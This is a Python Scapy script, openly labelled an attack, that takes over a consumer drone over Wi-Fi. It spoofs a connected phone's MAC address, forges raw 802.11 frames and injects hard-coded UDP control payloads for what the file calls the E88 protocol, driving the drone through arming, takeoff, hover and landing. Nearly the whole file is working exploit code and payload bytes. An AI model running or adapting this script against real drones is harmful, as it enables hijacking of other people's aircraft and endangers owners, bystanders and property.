#!/usr/bin/env python3
import time
import sys
from scapy.all import *

# --- CONFIGURATION ---
# REPLACE THIS with your Drone's BSSID found in airodump-ng
DRONE_MAC = "08:17:91:4B:8C:64"

# The interface in Monitor Mode
INTERFACE = "wlan1mon"

# We will spoof this client MAC. 
# If a phone is connected, use the PHONE'S MAC to hijack the session.
# If no phone is connected, you can use a random MAC.
SPOOFED_CLIENT_MAC = "EA:9C:F0:89:44:15"

# --- CONSTANTS ---
DRONE_IP = "192.168.1.1"
SPOOFED_IP = "192.168.1.100" # Typical IP assigned to phone
CONTROL_PORT = 7099

def build_raw_packet(payload):
    """
    Constructs a raw 802.11 Data frame encapsulating a UDP packet.
    """
    # 1. RadioTap Header (Physical Layer info)
    radiotap = RadioTap()

    # 2. 802.11 MAC Header
    # Type 2 = Data Frame
    # FCfield 'to-DS' = Going TO the Access Point (Drone)
    dot11 = Dot11(
        type=2, 
        subtype=0, 
        FCfield='to-DS', 
        addr1=DRONE_MAC,          # Receiver (Drone)
        addr2=SPOOFED_CLIENT_MAC, # Transmitter (Spoofed)
        addr3=DRONE_MAC           # Destination (Drone IP Stack)
    )

    # 3. LLC / SNAP Header (The bridge between Wi-Fi and IP)
    llc_snap = LLC(dsap=0xaa, ssap=0xaa, ctrl=3) / SNAP(OUI=0x000000, code=0x0800)

    # 4. IP Layer
    ip = IP(src=SPOOFED_IP, dst=DRONE_IP)

    # 5. UDP Layer
    udp = UDP(sport=55555, dport=CONTROL_PORT)

    # 6. The Payload
    return radiotap / dot11 / llc_snap / ip / udp / Raw(load=payload)

def send_command_stream(name, payload, duration=1):
    """Sends a command repeatedly to mimic the app's joystick hold."""
    print(f"[+] Injecting {name}...")
    end_time = time.time() + duration
    
    # Calculate sequence number (optional, Scapy handles minimal seq)
    seq = 0
    
    while time.time() < end_time:
        pkt = build_raw_packet(payload)
        
        # Manually increment sequence control if needed (usually not for UDP injection)
        # pkt.SC = seq << 4
        
        # Send packet at Layer 2 (Data Link Layer)
        sendp(pkt, iface=INTERFACE, verbose=0)
        
        time.sleep(0.02) # ~50Hz refresh rate
        seq += 1

# --- PAYLOADS (9-Byte E88 Protocol) ---
# Header: 03 66 | R P T Y | F1 F2 | 99
CMD_NEUTRAL = b"\x03\x66\x80\x80\x80\x80\x40\x40\x99"
CMD_ARM     = b"\x03\x66\xFF\x00\x00\x00\x40\x40\x99" # Sticks down/out
CMD_TAKEOFF = b"\x03\x66\x80\x80\x80\x80\x41\x40\x99" # Takeoff Flag
CMD_LAND    = b"\x03\x66\x80\x80\x80\x80\x42\x40\x99" # Land Flag
CMD_UP      = b"\x03\x66\x80\x80\xFF\x80\x40\x40\x99" # Throttle Max

# --- ATTACK SEQUENCE ---
if __name__ == "__main__":
    print(f"[*] Starting Raw Injection Attack on {DRONE_MAC}")
    print(f"[*] Spoofing Client: {SPOOFED_CLIENT_MAC}")
    
    try:
        # 1. Wake up the drone (Neutral stream)
        send_command_stream("Handshake/Neutral", CMD_NEUTRAL, duration=2)
        
        # 2. Arming Sequence (Throttle Up -> Down -> Up)
        # This mimics the app logic we found earlier
        send_command_stream("Arm: Throttle UP", CMD_UP, duration=0.5)
        send_command_stream("Arm: Throttle DOWN", b"\x03\x66\x80\x80\x00\x80\x40\x40\x99", duration=0.5)
        send_command_stream("Arm: Throttle UP", CMD_UP, duration=0.5)
        send_command_stream("Arm: Center", CMD_NEUTRAL, duration=1)
        
        input("Press ENTER to inject TAKEOFF command...")
        
        # 3. Takeoff
        send_command_stream("TAKEOFF", CMD_TAKEOFF, duration=1)
        
        # 4. Hover
        send_command_stream("Hovering", CMD_NEUTRAL, duration=5)
        
        print("[*] Sending Land...")
        send_command_stream("LAND", CMD_LAND, duration=2)
        
    except KeyboardInterrupt:
        print("\n[!] Aborted.")
